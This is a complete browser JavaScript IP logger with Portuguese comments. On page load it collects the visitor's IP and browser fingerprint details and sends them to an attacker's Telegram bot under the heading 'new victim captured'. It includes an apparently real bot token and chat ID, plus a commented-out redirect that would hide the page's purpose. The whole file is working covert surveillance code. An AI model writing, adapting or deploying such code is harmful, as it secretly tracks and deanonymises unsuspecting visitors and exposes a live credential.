// ============================================
// IP LOGGER + TELEGRAM BOT
// ============================================

// SEUS DADOS AQUI (já preenchidos!)
const BOT_TOKEN = "8819910333:AAHJFHDsJKpfkQuAGwlhsWlOPuuUXl948A4";
const CHAT_ID = "8551438856";

// ============================================
// FUNÇÃO PARA PEGAR IP
// ============================================
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'Não foi possível obter IP';
    }
}

// ============================================
// FUNÇÃO PARA PEGAR DADOS DO NAVEGADOR
// ============================================
function getBrowserData() {
    const data = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'Direto',
        url: window.location.href,
        timestamp: new Date().toLocaleString('pt-BR')
    };
    return data;
}

// ============================================
// FUNÇÃO PARA ENVIAR PRO TELEGRAM
// ============================================
async function sendToTelegram(ip, browserData) {
    const message = `
🕵️‍♂️ **NOVA VÍTIMA CAPTURADA**

🌐 **IP:** ${ip}
📍 **Localização:** https://ipinfo.io/${ip}

📱 **Dados do Visitante:**
━━━━━━━━━━━━━━━━━━━
🖥️ **SO/Dispositivo:** ${browserData.userAgent}
📐 **Tela:** ${browserData.screenWidth}x${browserData.screenHeight}px
🌍 **Idioma:** ${browserData.language}
🕰️ **Fuso:** ${browserData.timezone}
🔗 **Referer:** ${browserData.referrer}
📎 **URL:** ${browserData.url}
⏱️ **Data/Hora:** ${browserData.timestamp}
━━━━━━━━━━━━━━━━━━━
    `;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
        
        if (response.ok) {
            document.getElementById('status').textContent = '✅ Sucesso!';
            document.getElementById('status').style.color = '#00ff88';
        } else {
            document.getElementById('status').textContent = '❌ Erro ao enviar';
        }
    } catch {
        document.getElementById('status').textContent = '❌ Erro de conexão';
    }
}

// ============================================
// EXECUÇÃO PRINCIPAL
// ============================================
async function main() {
    document.getElementById('status').textContent = '📡 Coletando dados...';
    
    const ip = await getIP();
    const browserData = getBrowserData();
    
    document.getElementById('status').textContent = '📤 Enviando...';
    await sendToTelegram(ip, browserData);
    
    // Redireciona pra algum lugar (opcional)
    // setTimeout(() => {
    //     window.location.href = 'https://www.google.com';
    // }, 3000);
}

// RODA O SCRIPT
main();
